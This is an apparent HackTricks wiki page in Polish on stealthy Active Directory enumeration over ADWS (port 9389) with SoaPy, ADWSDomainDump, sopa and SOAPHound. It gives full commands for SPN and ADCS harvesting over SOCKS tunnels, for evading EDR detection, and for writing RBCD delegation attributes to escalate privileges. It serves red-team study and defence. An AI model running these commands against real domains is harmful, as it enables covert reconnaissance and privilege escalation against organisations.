# Active Directory Web Services (ADWS) Enumeracja i ukryte zbieranie

{{#include ../../banners/hacktricks-training.md}}

## Czym jest ADWS?

Active Directory Web Services (ADWS) jest **włączony domyślnie na każdym Domain Controller od Windows Server 2008 R2** i nasłuchuje na TCP **9389**. Pomimo nazwy, **HTTP nie jest zaangażowany**. Zamiast tego usługa udostępnia dane w stylu LDAP poprzez stos własnościowych protokołów .NET do ramkowania:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Ponieważ ruch jest enkapsulowany wewnątrz tych binarnych ramek SOAP i porusza się przez rzadko używany port, **enumeracja przez ADWS jest znacznie mniej prawdopodobna, że zostanie poddana inspekcji, filtrowaniu lub wykrywaniu na podstawie sygnatur niż klasyczny ruch LDAP/389 & 636**. Dla operatorów oznacza to:

* Bardziej ukryty recon – Blue teams często koncentrują się na zapytaniach LDAP.
* Możliwość zbierania z **hostów nie-Windows (Linux, macOS)** przez tunelowanie 9389/TCP przez SOCKS proxy.
* Te same dane, które uzyskałbyś przez LDAP (użytkownicy, grupy, ACL, schemat, itd.) oraz możliwość wykonywania **zapisów** (np. `msDs-AllowedToActOnBehalfOfOtherIdentity` dla **RBCD**).

Interakcje ADWS są implementowane nad WS-Enumeration: każde zapytanie zaczyna się od wiadomości `Enumerate`, która definiuje filtr/atrybuty LDAP i zwraca GUID `EnumerationContext`, po czym następuje jedna lub więcej wiadomości `Pull`, które przesyłają strumieniowo wyniki do wielkości okna zdefiniowanego przez serwer. Konteksty wygasają po ~30 minutach, więc narzędzia muszą albo stronicować wyniki, albo dzielić filtry (zapytania prefiksowe na CN), aby uniknąć utraty stanu. Przy żądaniu deskryptorów zabezpieczeń określ kontrolę `LDAP_SERVER_SD_FLAGS_OID`, aby pominąć SACLs, w przeciwnym razie ADWS po prostu usuwa atrybut `nTSecurityDescriptor` z odpowiedzi SOAP.

> UWAGA: ADWS jest również używany przez wiele narzędzi RSAT GUI/PowerShell, więc ruch może mieszać się z legalną aktywnością administratora.

## SoaPy – Natywny klient Pythona

[SoaPy](https://github.com/logangoins/soapy) to **pełna reimplementacja stosu protokołów ADWS w czystym Pythonie**. Tworzy ramki NBFX/NBFSE/NNS/NMF bajt-po-bajcie, umożliwiając zbieranie z systemów Unix-like bez użycia środowiska .NET.

### Kluczowe funkcje

* Obsługa **proxy przez SOCKS** (użyteczne z implantów C2).
* Precyzyjne filtry wyszukiwania identyczne z LDAP `-q '(objectClass=user)'`.
* Opcjonalne operacje **zapis/usuń** ( `--set` / `--delete` ).
* Tryb wyjścia **BOFHound** do bezpośredniego importu do BloodHound.
* Flaga `--parse` do ładnego formatowania timestampów / `userAccountControl` gdy wymagana jest czytelność dla człowieka.

### Flagi zbierania ukierunkowanego i operacje zapisu

SoaPy zawiera wyselekcjonowane przełączniki, które odtwarzają najczęstsze zadania łowiectwa LDAP przez ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, oraz surowe `--query` / `--filter` do niestandardowych pobrań. Połącz je z prymitywami zapisu takimi jak `--rbcd <source>` (ustawia `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (staging SPN do ukierunkowanego Kerberoasting) oraz `--asrep` (zmienia `DONT_REQ_PREAUTH` w `userAccountControl`).

Przykład ukierunkowanego przeszukiwania SPN, który zwraca tylko `samAccountName` i `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Użyj tych samych hosta/poświadczeń, aby natychmiast uzbroić ustalenia: dump RBCD-capable objects with `--rbcds`, następnie zastosuj `--rbcd 'WEBSRV01$' --account 'FILE01$'`, aby przygotować łańcuch Resource-Based Constrained Delegation (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) for the full abuse path).

### Instalacja (host operatora)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump przez ADWS (Linux/Windows)

* Fork `ldapdomaindump`, który zamienia zapytania LDAP na wywołania ADWS przez TCP/9389, aby zmniejszyć wykrycia sygnatur LDAP.
* Wykonuje wstępne sprawdzenie dostępności portu 9389, chyba że podano `--force` (pomija sondę, jeśli skanowanie portów jest głośne/odfiltrowane).
* Testowano przeciwko Microsoft Defender for Endpoint i CrowdStrike Falcon z udanym bypassem opisanym w README.

### Instalacja
```bash
pipx install .
```
### Użycie
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Typowe wyjście loguje sprawdzenie osiągalności 9389, ADWS bind oraz rozpoczęcie/zakończenie dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Praktyczny klient dla ADWS w Golang

Podobnie jak soapy, [sopa](https://github.com/Macmod/sopa) implementuje stos protokołu ADWS (MS-NNS + MC-NMF + SOAP) w Golangu, udostępniając opcje wiersza poleceń do wykonywania wywołań ADWS, takich jak:

* **Wyszukiwanie i pobieranie obiektów** - `query` / `get`
* **Cykl życia obiektu** - `create [user|computer|group|ou|container|custom]` i `delete`
* **Edycja atrybutów** - `attr [add|replace|delete]`
* **Zarządzanie kontami** - `set-password` / `change-password`
* oraz inne, takie jak `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, itd.

## SOAPHound – Masowe zbieranie ADWS (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) to kolektor .NET, który utrzymuje wszystkie interakcje LDAP wewnątrz ADWS i generuje JSON zgodny z BloodHound v4. Tworzy jednorazowo kompletny cache `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` (`--buildcache`), a następnie ponownie wykorzystuje go do masowych przebiegów `--bhdump`, `--certdump` (ADCS) lub `--dnsdump` (AD-integrated DNS), dzięki czemu tylko ~35 krytycznych atrybutów opuszcza DC. AutoSplit (`--autosplit --threshold <N>`) automatycznie dzieli zapytania na shardy według prefiksu CN, aby utrzymać się poniżej 30-minutowego limitu EnumerationContext w dużych lasach.

Typowy przebieg pracy na VM operatora dołączonym do domeny:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Pliki JSON są eksportowane bezpośrednio do workflowów SharpHound/BloodHound — zobacz [BloodHound methodology](bloodhound.md) dla pomysłów na dalsze tworzenie grafów. AutoSplit sprawia, że SOAPHound jest odporny na lasy z wielomilionową liczbą obiektów, przy jednoczesnym utrzymaniu liczby zapytań niższej niż ADExplorer-style snapshots.

## Skryty przepływ zbierania AD

Poniższy przepływ pokazuje, jak enumerować **domain & ADCS objects** przez ADWS, konwertować je do BloodHound JSON i wyszukiwać ścieżki ataku oparte na certyfikatach — wszystko z Linuxa:

1. **Tunnel 9389/TCP** z sieci celu do twojej maszyny (np. via Chisel, Meterpreter, SSH dynamic port-forward, itd.). Wyeksportuj `export HTTPS_PROXY=socks5://127.0.0.1:1080` lub użyj opcji SoaPy `--proxyHost/--proxyPort`.

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Zbierz obiekty związane z ADCS z Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Konwertuj do BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Prześlij plik ZIP** w GUI BloodHound i uruchom zapytania cypher takie jak `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` aby ujawnić ścieżki eskalacji certyfikatów (ESC1, ESC8, itd.).

### Zapisywanie `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Połącz to z `s4u2proxy`/`Rubeus /getticket` aby uzyskać pełny łańcuch **Resource-Based Constrained Delegation** (zob. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Podsumowanie narzędzi

| Cel | Narzędzie | Uwagi |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, odczyt/zapis |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Konwertuje logi SoaPy/ldapsearch |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Może być przekierowane przez ten sam SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Ogólny klient do interakcji ze znanymi punktami końcowymi ADWS - umożliwia enumeration, tworzenie obiektów, modyfikacje atrybutów i zmiany haseł |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
